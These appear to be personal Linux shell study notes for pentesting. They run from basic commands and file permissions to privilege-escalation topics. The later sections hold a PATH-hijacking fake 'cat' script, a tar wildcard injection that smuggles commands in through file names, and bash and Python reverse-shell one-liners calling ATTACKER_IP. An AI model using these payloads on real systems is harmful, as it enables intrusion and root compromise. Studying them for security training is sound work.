# 🔴 Introduction to the Linux Shell


- `ssh -o "UserKnownHostsFile=/dev/null" user@ip` - Want to save fingerprint or not
- sudo : Super user do
- man 

## 🟢 Difference between Terminal, TTY and Shell

```
User
  ↕
Terminal Emulator (xterm, gnome-terminal, kitty, etc.)
  ↕
TTY / PTY 
  ↕
Shell (bash, zsh, fish)
  ↕
Operating System
```

- shell - interpreter you use to interact with os
- terminal - graphical program used to interact with the shell
- tty - where terminal and shell use to exchange info


## 🟢 Basic Commands

- `whoami` : gives current username
- `id` : userid, groupid, which group you belong to
- `hostname` : name of your host
- `pwd` : print working directory
- `env` : variables that control the program in the shell or also the other programs
- `which commandName` : the path within a file system for that particular program


## 🟢 Relative and Absolute Paths

- Absolute path : Always starts with root of the file system
- Relative path : Dont start from the root but start from the current working directory


## 🟢 File System Commands

- `pwd` : print working directory
- `cd` : change directory
- `ls` : list 
- `ls -al` : Show hidden files
- `mv` : move files
- `cp` : copy files
- `rm` : remove files
- `echo "hello1" > text1.txt` : create a file with content hello1


## 🟢 Resources Management Commands

- `fdisk -l` : How many devices are connected to our computer
- `df -h` : How much space if taken or left
- `du -h` : shows how much spack a certain directory holds
- `ps` : Process
- `ps aux` : system processes
- `ps -axjf` : Hierarchy of the process
- `ip address , ip a` : network interfaces
- `netstat -ltp` : Display all the TCP listening ports, displaying PID/program names and resolve names with IP address on that machine



## 🟢 User Management Commands

- `sudo useradd -m <USERNAME>` : Create new user with default settings
- `sudo passwd <USERNAME>` : Change user password
- `sudo userdel -r <USERNAME>` : Delete user
- `groups <USERNAME>` : List groups of a given user
- `groupadd <GROUPNAME>` : Create new group
- `usermod -a -G <GROUPNAME> <USERNAME>` : Add user to group


## 🟢 Packages Mangaement Commands


## 🟢 Linux File System Permissions

- `ls -lha`

```plaintext

EXAMPLE:
drwxrwxrwt
drwxr-xr-x
-rw-r--r--

We find 10 letters, which can be either set or not set:
- The first specifies the ~type of the file~.
    - Regular files -> "-"
    - Directories -> "d"
    - Links -> "l"
- Then we find three groups of three letters each 
    These specify the permissions for three types of users:
    - The first group specifies the permissions for the user who is also the owner of the file.
    - The second group specifies the permissions for the user who belongs to the group that owns the file.
    - The third group specifies the permissions for all other uses. That is, for users who do not belong in the
      group that owns the file and are not the owner of the file themselves
- Each group works in the same way.
  We have three distinct types of permissions:
    - Read permission (r)
    - Write permission (w)
    - Execute permission (x)
  There are minor variants in this. For example, when setting the SUID bit on an executable, the execute           permission will be written as ~s~ instead of ~x~.

  Sometimes it can happen to see for the last position the value of ~t~ instead of the value of ~x~. This is       called the "sticky bit". It implies that users in the group ~root~ who technically have the permissions tho      delete a file (write), cannot do it as long as the sticky bit is set.
```


## 🟢 How to set new permissions with chmod

```
Permission groups:

- u → User (owner)
- g → Group
- o → Others
- a → All (user + group + others)

Permission actions:

 + → Add permission
 - → Remove permission
 = → Set exact permission

Permission types:

- r → Read
- w → Write
- x → Execute

Examples:

```bash
chmod u+x script.sh      # Give execute permission to owner
chmod g-w file.txt      # Remove write permission from group
chmod o+r notes.txt     # Give read permission to others
chmod a+x program       # Give execute permission to everyone
chmod u=rw file.txt     # Set owner permission to read & write only
```

```
0 -> 000 -> ---
1 -> 001 -> --x
2 -> 010 -> -w-
3 -> 011 -> -wx
4 -> 100 -> r--
5 -> 101 -> r-x
6 -> 110 -> rw-
7 -> 111 -> rwx
```

**sudo chown root:root hi.sh - change owner of the file**

## 🟢 SUID and GUID bits

**SUID** stands for **Set User ID**.

Binaries that have this bit allow the binary to change user permission during its execution. Specifically, it allows the program to be executed by anyone. Then, during its execution, it will change its permission and take the permissions of the owner of the file.

The executable flag is not (x) but rather (s). This is because the program has the SUID bit set. This means that during its execution, at specific times, the program will change its roles in order to become root. 

- chmod +s/u+s/u-s h.sh (first set +s and then +x for executing)
- sudo -l
- (root) , (ALL) NOPASSWD , (scriptmanager : scriptmanager) NOPASSWD : ALL

#### Security Issues with SUID

Having a binary that runs as the owner of the file can be problematic when the owner of said file is the root user. More specifically, we might be able to:
1. Read files owned by root
2. Read and write files owned by root
3. Execute arbitrary code as the root user

**Real User ID, Effective User ID, Saved User ID**

To understand the role of SUID, it is important to understand that we have three different types of user IDs for any process being executed.
- Real User ID : Who you really are, and therefore who owns the process.
- Effective User ID : What the operating system looks at to make authorization decision, i.e. whether or not you are allowed to do something.
- Saved User ID : Used when a program running with elevated privileges needs to do some unprivileged work temporarily.

GTFOBINS - https://gtfobins.org/

**Find SUID files**

`find / -perm -4000 2>/dev/null`

**Find SGID**

`find / -perm -2000 2>/dev/null`

## 🟢 PATH Hijacking


**What is a PATH:** When you launch a program, for example in the shell, you typically just write the name of the program. For example, if I want to list out all the files in a given directory, I can use the ls program as follows

`ls`

Now, how does the shell process know which command to execute? Remember that in modern operating systems, resources are located in specific paths of a file system. All sorts of resources are located like that. Even binaries, which are the programs we use to do various activities.
This means that before executing the command, the shell needs to resolve its full path, that is, it needs to know where does the program reside within the file system. This is where the concept of a PATH comes in.
IMPORTANT: The PATH is an environment variable, found within the shell and other processes as well, which determines the folders to Look in order to resolve command names into full paths.
In order to print the value of the PATH, within the shell bash we can execute the following command

`echo $PATH`

Now, how is PATH used? Simple, when you launch a program without a full path, such as when we just executed the command ls, the shell will use this list of folders in order to look for the ls binary. It will start from the first folder, and, until it has found an ls binary, it will keep looking for further folders, until all of them have been checked.

```
1. Create a malicous bash script and call it cat within the current folder

    echo -en '#!/usr/bin/env sh\n/bin/bash\n' > cat
    chmod +x cat

2. Launch the program with a malicious PATH variable

    PATH=$PATH./reader 01.txt
```


## 🟢 SUDO

**What is SUDO:** SuperUserDO
- To check the configuration for the sudo program, execute `sudo -l`
- The configuration is found within `/etc/sudoers`


## 🟢 Shell Wildcards

When using shells such as sh or bash, it is often useful to use wildcard characters to perform more complex actions. In the linux environment we have the following wildcard characters, also called "globbing patterns"

- ? (question mark) : This can represent any single character.
- * (asterisk) : This can represent any number of characters (including zero, in other words, zero or more characters)
- [] (square brackets) : specifies a range.
- {} (curly brackets) : terms are separated by commas and each term must be the name of

### The Danger of Wildcards

What if an attacker cant modify this command directly cant write on the script that executes this command however this commands has a wild card that reads from some directory and the attacker has control over that directory then it can introduce malicious files with specific file names so that when the wild card is expanded we're going to change the command that is executed.

**Example**

- tar : Create malicious file (echo 'touch /tmp/sc1/hacked' > /tmp/sc1/shell.sh ---> echo "" > "--checkpoint-action=exec=sh shell.sh" ---> echo "--checkpoint=1")

- find , rsync


## Shell

**Reverse Shell vs Bind Shell** - Reverse shells are Better
**File transfer command** - python3 -m http.server 1234

### Spawning a Reverse Shell

- **Bash** : bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
- **Python** : Reverse shell payload - `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
        Shell Upgrade - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- 


























